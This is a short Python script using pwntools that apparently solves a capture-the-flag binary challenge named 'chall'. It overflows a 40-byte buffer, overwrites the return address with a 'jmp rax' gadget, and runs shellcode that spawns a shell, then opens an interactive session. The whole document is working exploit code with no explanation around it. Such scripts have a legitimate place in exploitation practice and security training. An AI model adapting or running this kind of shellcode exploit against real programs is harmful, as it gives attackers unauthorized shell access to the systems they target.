from pwn import *

elf = context.binary = ELF('./chall')
p = process()

jmp_rax = 0x4010cc
jump = asm('jmp rsp')
payload = jump.ljust(40, b'A')
payload += p64(jmp_rax)
payload += asm('sub rsp, 0x100') + asm(shellcraft.sh())

p.sendlineafter('shell?\n', payload)
p.interactive()